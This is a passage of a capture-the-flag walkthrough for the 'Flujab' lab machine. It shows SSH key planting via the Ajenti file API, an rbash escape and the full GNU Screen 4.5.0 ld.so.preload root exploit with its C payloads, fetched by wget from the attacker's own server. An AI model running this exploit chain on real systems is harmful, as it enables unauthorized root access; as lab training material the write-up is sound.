    <p>It reveals that the remote connections must be <strong><em>whitelisted</em></strong> and that the public key requires a <strong>passphrase</strong></p>

    <p>Editing <strong><code class="highlighter-rouge">/etc/hosts.allow</code></strong> to whitelist your own IP address:</p>

    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># grant ssh access per host
# syntax:
# sshd : [host ip]
###########################

sshd : 10.10.15.10
sshd : 127.0.0.1
</code></pre></div>    </div>

    <p>Then retry the connection via <code class="highlighter-rouge">ssh</code>:</p>

    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-i</span> userkey <span class="nt">-l</span> drno 10.10.10.124
<span class="go">
   Enter passphrase for key 'userkey': 
   drno@10.10.10.124: Permission denied (publickey).
      
</span></code></pre></div>    </div>

    <p>No credentials for <strong><code class="highlighter-rouge">drno</code></strong> has been found so far but what if a newly generated RSA key pair was written to <code class="highlighter-rouge">.ssh/authorized_keys</code> or <code class="highlighter-rouge">access</code></p>

    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 4096
<span class="go">
  Generating public/private rsa key pair.
  Enter file in which to save the key (/home/.../.ssh/id_rsa): .ssh/id_rsa
  Enter passphrase (empty for no passphrase): flujab
  Enter same passphrase again: flujab
  Your identification has been saved in .ssh/id_rsa.
  Your public key has been saved in .ssh/id_rsa.pub.
  The key fingerprint is:
  SHA256:xHmVZlXhLq8Gp0FvcWd9IFKymV97HHM6BP3K3RxkEVw jebidiah@LAPTOP-C54THGLR
  The key's randomart image is:
    +---[RSA 4096]----+
    |          ..++o=E|
    |       . ..*=.++ |
    |        + =+ .=*o|
    |       . . o +.*X|
    |        S . oo**B|
    |           o +=o+|
    |            *  . |
    |           . ..  |
    |            ..   |
    +----[SHA256]-----+

</span></code></pre></div>    </div>

    <p>Writing the <strong><code class="highlighter-rouge">id_rsa.pub</code></strong> file then changing its permissions using the Ajenti API:</p>

    <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/api/filesystem/write//home/sysadm/access?encoding=utf-8</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">sysadmin-console-01.flujab.htb:8080</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json, text/plain, */*</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">https://sysadmin-console-01.flujab.htb:8080/view/notepad//home/sysadm/access</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json;charset=utf-8</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">724</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">...</span>

<span class="err">ssh-rsa</span><span class="w"> </span><span class="err">AAAAB</span><span class="mi">3</span><span class="err">NzaC</span><span class="mi">1</span><span class="err">yc</span><span class="mi">2</span><span class="err">EAAAADAQABAAACAQCiZ+jqG</span><span class="mi">9</span><span class="err">aLGvumbTF</span><span class="mi">4</span><span class="err">wGsff</span><span class="mi">1</span><span class="err">tooQuWOFvqSqna</span><span class="mi">7</span><span class="err">O</span><span class="mi">0</span><span class="err">hSdDIB</span><span class="mi">43</span><span class="err">mwIy</span><span class="mi">1</span><span class="err">yYGvhH</span><span class="mi">75</span><span class="err">T</span><span class="mi">9</span><span class="err">h</span><span class="mi">4</span><span class="err">XkFc</span><span class="mi">1</span><span class="err">PeWdflT</span><span class="mi">14</span><span class="err">ox</span><span class="mi">4</span><span class="err">M</span><span class="mi">1</span><span class="err">imLIk</span><span class="mi">8</span><span class="err">DMFHZLac</span><span class="mi">9</span><span class="err">e/nEs+cJzmk+BDVG</span><span class="mi">5</span><span class="err">AckG</span><span class="mi">3</span><span class="err">DnSaa</span><span class="mi">0</span><span class="err">f</span><span class="mi">3</span><span class="err">ftfSsRVqCnD</span><span class="mi">3</span><span class="err">SXdhYH+KKO</span><span class="mi">2</span><span class="err">WaQRt</span><span class="mi">4</span><span class="err">Nsv</span><span class="mi">6</span><span class="err">BGcomnJm/b</span><span class="mi">1</span><span class="err">vr/zn</span><span class="mi">2</span><span class="err">fkwEiC</span><span class="mi">0</span><span class="err">fI</span><span class="mi">2</span><span class="err">cENvZ</span><span class="mi">3</span><span class="err">HaEvVrVnDESc</span><span class="mi">4</span><span class="err">TKPiPiZSZ</span><span class="mi">8</span><span class="err">TnfMi++nDwVbZOroOoo</span><span class="mi">1</span><span class="err">InrL</span><span class="mi">3</span><span class="err">jSDYuuZR</span><span class="mi">0</span><span class="err">Qn</span><span class="mi">7</span><span class="err">TGMoh+anLBxdCRgQuPqav</span><span class="mi">1</span><span class="err">br</span><span class="mi">0</span><span class="err">g</span><span class="mi">0</span><span class="err">OrTvr</span><span class="mi">39</span><span class="err">IsfsCPNVSrknISPnzPvekaYJkoihdTwezbaCo</span><span class="mi">63</span><span class="err">/wBhTk</span><span class="mi">25</span><span class="err">nW+y</span><span class="mi">57</span><span class="err">b</span><span class="mi">3</span><span class="err">FRaCyUbBCw</span><span class="mi">5</span><span class="err">+Qrshc</span><span class="mi">5</span><span class="err">HNxYhfy</span><span class="mi">1</span><span class="err">pujFkfVDfuKgZhUFIGJKqkFjX+DTJqulZL</span><span class="mi">8</span><span class="err">LtyoWrhGVIBkYmblAIchc</span><span class="mi">8</span><span class="err">ZXwzDnHPyezqTmrYTuSNipuFCYcVQ</span><span class="mi">8</span><span class="err">iYXprIAXlNHFh</span><span class="mi">4e0</span><span class="err">+mgnJ/J</span><span class="mi">0</span><span class="err">QS</span><span class="mi">5</span><span class="err">mvVQaDlRrZnB</span><span class="mi">1</span><span class="err">s</span><span class="mi">9</span><span class="err">/</span><span class="mi">6</span><span class="err">VDSUH</span><span class="mi">7</span><span class="err">W</span><span class="mi">8</span><span class="err">X+ZbC</span><span class="mi">4</span><span class="err">lKM</span><span class="mi">816</span><span class="err">VHnBJDW/IZw+LK</span><span class="mi">4</span><span class="err">jf</span><span class="mi">4</span><span class="err">tndx</span><span class="mi">2</span><span class="err">GZCsa</span><span class="mi">8</span><span class="err">aI</span><span class="mi">6</span><span class="err">u</span><span class="mi">9</span><span class="err">WvUAfc</span><span class="mi">5</span><span class="err">gHkrx</span><span class="mi">5</span><span class="err">EZT</span><span class="mi">2</span><span class="err">ewIbjNKdIeFOEY/</span><span class="mi">2</span><span class="err">kCFypGGBB</span><span class="mi">5758</span><span class="err">wgfS</span><span class="mi">7</span><span class="err">MDbFtI</span><span class="mi">1</span><span class="err">hgZ</span><span class="mi">8</span><span class="err">+fGac</span><span class="mi">3</span><span class="err">Bt</span><span class="mi">2</span><span class="err">MEWKM</span><span class="mi">2</span><span class="err">vO</span><span class="mi">9</span><span class="err">IgBH</span><span class="mi">8</span><span class="err">vaTbLvxIOs</span><span class="mi">3</span><span class="err">gnTR</span><span class="mi">3</span><span class="err">i/EPKh</span><span class="mi">8</span><span class="err">IG</span><span class="mi">8</span><span class="err">/VOwGneT</span><span class="mi">4</span><span class="err">kNJQN+hQ==</span><span class="w">
</span></code></pre></div>    </div>

    <p>The user, <strong><code class="highlighter-rouge">sysadm</code></strong>, has a writable home directory and the <strong><code class="highlighter-rouge">id_rsa.pub</code></strong> file is written to a file named, <strong><code class="highlighter-rouge">access</code></strong>. (referring to <strong><code class="highlighter-rouge">sshd_config</code></strong>)</p>

    <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/api/filesystem/chmod//home/sysadm/access?encoding=utf-8</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">sysadmin-console-01.flujab.htb:8080</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json, text/plain, */*</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">https://sysadmin-console-01.flujab.htb:8080/view/notepad//home/sysadm/access</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json;charset=utf-8</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">12</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">...</span>

<span class="p">{</span><span class="nl">"mode"</span><span class="p">:</span><span class="mi">292</span><span class="p">}</span><span class="w">
</span></code></pre></div>    </div>

    <p>According to the <a href="http://docs.ajenti.org/en/latest/refjs/filesystem.html"><code class="highlighter-rouge">ajenti.filesystem</code> documentation</a>, <strong><code class="highlighter-rouge">chmod</code></strong> accepts 2 arguments – <strong><code class="highlighter-rouge">(path, mode)</code></strong> where <strong><code class="highlighter-rouge">mode</code></strong> accepts an integer value.</p>

    <blockquote>
      <p><strong><code class="highlighter-rouge">chmod</code></strong> uses <strong><em>octal values</em></strong> for user, group, global, and other permissions</p>

      <p>The <strong>octal value</strong> for <strong><code class="highlighter-rouge">-r--r--r--</code></strong> is <strong><code class="highlighter-rouge">0444</code></strong> wchi in decimal (or integer value), <strong><code class="highlighter-rouge">0444</code></strong> is <strong><code class="highlighter-rouge">292</code></strong>.</p>
    </blockquote>
  </li>
  <li>
    <p>Now, reconnecting to 10.10.10.124 via <strong><code class="highlighter-rouge">ssh</code></strong> using the generated RSA key pair and as user, <strong><code class="highlighter-rouge">sysadm</code></strong>:</p>

    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">chmod </span>400 .ssh/id_rsa
<span class="go">
</span><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-i</span> .ssh/id_rsa <span class="nt">-l</span> sysadm 10.10.10.124
<span class="go">  Enter passphrase for key '.ssh/id_rsa': flujab

</span><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span>
<span class="go">       
  -rbash: cd: restricted

</span></code></pre></div>    </div>

    <p>All users are trapped in a restricted shell (<strong><code class="highlighter-rouge">/bin/rbash</code></strong>):</p>

    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python <span class="nt">--version</span>
<span class="go">        
  Python 2.7.13

</span></code></pre></div>    </div>

    <p>But luckily, the shell accepts <code class="highlighter-rouge">python</code> instructions which could be leveraged for proper command execution:</p>

    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
</code></pre></div>    </div>
  </li>
</ol>

<hr />

<h2 id="part-5--privilege-escalation-sysadm---root">PART 5 : PRIVILEGE ESCALATION (sysadm -&gt; root)</h2>

<ol>
  <li>
    <p>Check for <strong>SUID files</strong> owned by <code class="highlighter-rouge">root</code>:</p>

    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>find / <span class="nt">-uid</span> 0 <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null
<span class="go">
  ...omitted...
  /usr/local/share/screen/screen
  ...omitted...
  /usr/bin/screen
  ...omitted...

</span></code></pre></div>    </div>

    <p>There are two binaries with the same name (<strong><code class="highlighter-rouge">screen</code></strong>) which can write files to the system using its <strong><code class="highlighter-rouge">-L Turn on output logging.</code></strong> option</p>
  </li>
  <li>
    <p>Check the binaries’ version:</p>

    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>/usr/local/share/screen/screen <span class="nt">-v</span>
<span class="go">   
   Screen version 4.05.00 (GNU) 10-Dec-16

</span><span class="gp">$</span><span class="w"> </span>/usr/bin/screen <span class="nt">-v</span>
<span class="go">    
   Screen version 4.05.00 (GNU) 10-Dec-16

</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nv">$PATH</span>
<span class="go">    
  /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
 
</span></code></pre></div>    </div>

    <p>Both are running <strong><code class="highlighter-rouge">version 4.05.00</code></strong> but <strong><code class="highlighter-rouge">/usr/local/share</code></strong> is not in the <strong><code class="highlighter-rouge">PATH</code></strong> variable which might mean that <strong><code class="highlighter-rouge">/usr/local/share/screen/screen</code></strong> might be a modified binary with an SUID bit.</p>
  </li>
  <li>
    <p>Searching for available exploits using <strong><code class="highlighter-rouge">searchsploit</code></strong>:</p>

    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>searchsploit screen | <span class="nb">grep </span>4.5
<span class="go">     
  GNU Screen 4.5.0 - Local Privilege Escalation            | exploits/linux/local/41154.sh
  GNU Screen 4.5.0 - Local Privilege Escalation (PoC)      | exploits/linux/local/41152.txt

</span><span class="gp">$</span><span class="w"> </span>searchsploit <span class="nt">-m</span> exploits/linux/local/41154.sh
<span class="go">   
    Exploit: GNU Screen 4.5.0 - Local Privilege Escalation
        URL: https://www.exploit-db.com/exploits/41154
       Path: /usr/share/exploitdb/exploits/linux/local/41154.sh
  File Type: Bourne-Again shell script, ASCII text executable, with CRLF line terminators

</span></code></pre></div>    </div>

    <p>The exploit (<strong><code class="highlighter-rouge">41154.sh</code></strong>) contains:</p>

    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="c"># screenroot.sh</span>
<span class="c"># setuid screen v4.5.0 local root exploit</span>
<span class="c"># abuses ld.so.preload overwriting to get root.</span>
<span class="c"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span>
<span class="c"># HACK THE PLANET</span>
<span class="c"># ~ infodox (25/1/2017) </span>
<span class="nb">echo</span> <span class="s2">"~ gnu/screenroot ~"</span>
<span class="nb">echo</span> <span class="s2">"[+] First, we create our shell and library..."</span>
<span class="nb">cat</span> <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh"> &gt; /tmp/libhax.c
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!</span><span class="se">\n</span><span class="sh">");
}
</span><span class="no">EOF
</span>gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-ldl</span> <span class="nt">-o</span> /tmp/libhax.so /tmp/libhax.c
<span class="nb">rm</span> <span class="nt">-f</span> /tmp/libhax.c
<span class="nb">cat</span> <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh"> &gt; /tmp/rootshell.c
#include &lt;stdio.h&gt;
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
</span><span class="no">EOF
</span>gcc <span class="nt">-o</span> /tmp/rootshell /tmp/rootshell.c
<span class="nb">rm</span> <span class="nt">-f</span> /tmp/rootshell.c
<span class="nb">echo</span> <span class="s2">"[+] Now we create our /etc/ld.so.preload file..."</span>
<span class="nb">cd</span> /etc
<span class="nb">umask </span>000 <span class="c"># because</span>
screen <span class="nt">-D</span> <span class="nt">-m</span> <span class="nt">-L</span> ld.so.preload <span class="nb">echo</span> <span class="nt">-ne</span>  <span class="s2">"</span><span class="se">\x</span><span class="s2">0a/tmp/libhax.so"</span> <span class="c"># newline needed</span>
<span class="nb">echo</span> <span class="s2">"[+] Triggering..."</span>
screen <span class="nt">-ls</span> <span class="c"># screen itself is setuid, so... </span>
/tmp/rootshell
</code></pre></div>    </div>

    <p>The exploit works like this:</p>
    <blockquote>
      <ol>
        <li>It two files – <strong><code class="highlighter-rouge">libhax.c</code></strong> and <strong><code class="highlighter-rouge">rootshell.c</code></strong></li>
        <li><strong><code class="highlighter-rouge">libhax.c</code></strong> is compiled as a <strong><em>shared object</em></strong> file (<strong><code class="highlighter-rouge">libhax.so</code></strong>)</li>
        <li><strong><code class="highlighter-rouge">rootshell.c</code></strong> is compiled as an executable (<strong><code class="highlighter-rouge">rootshell</code></strong>)</li>
        <li><strong><code class="highlighter-rouge">libhax.so</code></strong> is wriiten to <strong><code class="highlighter-rouge">/etc/ld.so.preload</code></strong></li>
      </ol>
    </blockquote>

    <p>The <strong><code class="highlighter-rouge">screen</code></strong> binary is used to append to the <strong><code class="highlighter-rouge">/etc/ld.so.preload</code></strong> file which is only writable as <strong><code class="highlighter-rouge">root</code></strong>. <strong><em>shared objects</em></strong> written in <code class="highlighter-rouge">/etc/ld.so.preload</code> are loaded before everything else which is even capable of overwriting <strong><em>libc</em></strong> functions and since <strong><code class="highlighter-rouge">libhax.so</code></strong> gives SUID permissions to the created <strong><code class="highlighter-rouge">/tmp/rootshell</code></strong> executable, a root shell should be spawned upon successful exploit.</p>
  </li>
  <li>
    <p>Enumerating the system using <code class="highlighter-rouge">sysadm</code> shell to see how the exploit will be compiled:</p>

    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">uname</span> <span class="nt">-a</span>
<span class="go">    
</span><span class="gp">  Linux flujab 4.9.0-8-amd64 #</span>1 SMP Debian 4.9.130-2 <span class="o">(</span>2018-10-27<span class="o">)</span> x86_64 GNU/Linux
<span class="go">
</span><span class="gp">$</span><span class="w"> </span>gcc
<span class="go">     
  bash: gcc: command not found

</span></code></pre></div>    </div>

    <p>The system runs on a 64-bit architecture and <code class="highlighter-rouge">gcc</code> is not available in the system.</p>
  </li>
  <li>
    <p>Instead, create and compile <code class="highlighter-rouge">libhax.c</code> and <code class="highlighter-rouge">rootshell.c</code> locally:</p>

    <h3 id="exploit-1--libhaxc"><strong style="text-decoration:underline">EXPLOIT #1 : libhax.c</strong></h3>

    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>vim libhax.c
</code></pre></div>    </div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
</span><span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span>
<span class="kt">void</span> <span class="nf">dropshell</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">chown</span><span class="p">(</span><span class="s">"/tmp/rootshell"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">chmod</span><span class="p">(</span><span class="s">"/tmp/rootshell"</span><span class="p">,</span> <span class="mo">04755</span><span class="p">);</span>
    <span class="n">unlink</span><span class="p">(</span><span class="s">"/etc/ld.so.preload"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] done!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>    </div>
    <div class="language-vim highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">:</span><span class="k">wq</span>
</code></pre></div>    </div>

    <h3 id="exploit-2--rootshellc"><strong style="text-decoration:underline">EXPLOIT #2 : rootshell.c</strong></h3>

    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>vim rootshell.c
</code></pre></div>    </div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">seteuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">setegid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">execvp</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>    </div>
    <div class="language-vim highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">:</span><span class="k">wq</span>
</code></pre></div>    </div>

    <h3 id="exploit-3--compiling-the-binaries"><strong style="text-decoration:underline">EXPLOIT #3 : COMPILING THE BINARIES</strong></h3>

    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-ldl</span> <span class="nt">-o</span> libhax.so libhax.c
<span class="go">
  libhax.c: In function ‘dropshell’:
</span><span class="gp">  libhax.c:7:5: warning: implicit declaration of function ‘chmod’;</span><span class="w"> </span>did you mean ‘chroot’? <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
<span class="gp">       chmod("/tmp/rootshell", 04755);</span><span class="w">
</span><span class="go">       ^~~~~
       chroot

</span><span class="gp">$</span><span class="w"> </span>gcc <span class="nt">-o</span> rootshell rootshell.c
<span class="go">
  rootshell.c: In function ‘main’:
</span><span class="gp">  rootshell.c:3:5: warning: implicit declaration of function ‘setuid’;</span><span class="w"> </span>did you mean ‘setbuf’? <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
<span class="gp">       setuid(0);</span><span class="w">
</span><span class="go">       ^~~~~~
       setbuf
</span><span class="gp">  rootshell.c:4:5: warning: implicit declaration of function ‘setgid’;</span><span class="w"> </span>did you mean ‘setbuf’? <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
<span class="gp">       setgid(0);</span><span class="w">
</span><span class="go">       ^~~~~~
       setbuf
</span><span class="gp">  rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’;</span><span class="w"> </span>did you mean ‘setbuf’? <span class="o">[</span><span class="nt">-Wimplicit-function-declaration</span><span class="o">]</span>
<span class="gp">       seteuid(0);</span><span class="w">
</span><span class="go">       ^~~~~~~
       setbuf
  rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
</span><span class="gp">       setegid(0);</span><span class="w">
</span><span class="go">       ^~~~~~~
  rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
</span><span class="gp">       execvp("/bin/sh", NULL, NULL);</span><span class="w">
</span><span class="go">       ^~~~~~

</span></code></pre></div>    </div>
  </li>
  <li>
    <p>Upload the binaries using a python <strong><code class="highlighter-rouge">SimpleHTTPServer</code></strong> to the <code class="highlighter-rouge">sysadm</code> shell then execute the exploit:</p>

    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd /tmp

$ wget http://10.10.15.10:8000/libhax.so
      
  libhax.so           100%[===================&gt;]  15.76K  62.6KB/s    in 0.3s

$ wget http://10.10.15.10:8000/rootshell
      
  rootshell           100%[===================&gt;]  16.43K  52.1KB/s    in 0.3s   
 
</code></pre></div>    </div>

    <h3 id="exploit-4--executing-the-exploit"><strong style="text-decoration:underline">EXPLOIT #4 : EXECUTING THE EXPLOIT</strong></h3>

    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">chmod</span> +x /tmp/rootshell
<span class="go">
</span><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> /etc
<span class="go">
</span><span class="gp">$</span><span class="w"> </span><span class="nb">umask </span>000
<span class="go">
</span><span class="gp">$</span><span class="w"> </span>/usr/local/share/screen/screen <span class="nt">-D</span> <span class="nt">-m</span> <span class="nt">-L</span> ld.so.preload <span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">0a/tmp/libhax.so"</span>
<span class="go">
</span><span class="gp">$</span><span class="w"> </span>/usr/local/share/screen/screen <span class="nt">-ls</span>
<span class="go">      
  No Sockets found in /tmp/screens/S-sysadm.

</span><span class="gp">$</span><span class="w"> </span>/tmp/rootshell
<span class="go">
</span><span class="gp">#</span><span class="w"> </span><span class="nb">id</span>
<span class="go">      
  uid=0(root) gid=0(root) groups=0(root),1007(sysadm)

</span><span class="gp">#</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
<span class="go">      
  7081........................ee33
     
</span><span class="gp">#</span><span class="w"> </span>find /home <span class="nt">-name</span> user.txt <span class="nt">-exec</span> <span class="nb">cat</span> <span class="o">{}</span> +
<span class="go">
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  c519........................62d4
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P           
  This is A Nope !!! :P

</span></code></pre></div>    </div>
  </li>
</ol>
</section>
       </div>
    </div>

    <script>
      function openNav() {
        document.getElementById("sidebar").style.width = "250px";
        document.getElementById("content").style.marginLeft = "250px";
      }
      function closeNav() {
        document.getElementById("sidebar").removeAttribute("style");
        document.getElementById("content").removeAttribute("style");
      } 
    </script>

    
      <script>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'true', 'auto');
        ga('send', 'pageview');
      </script>
    
  </body>
</html>
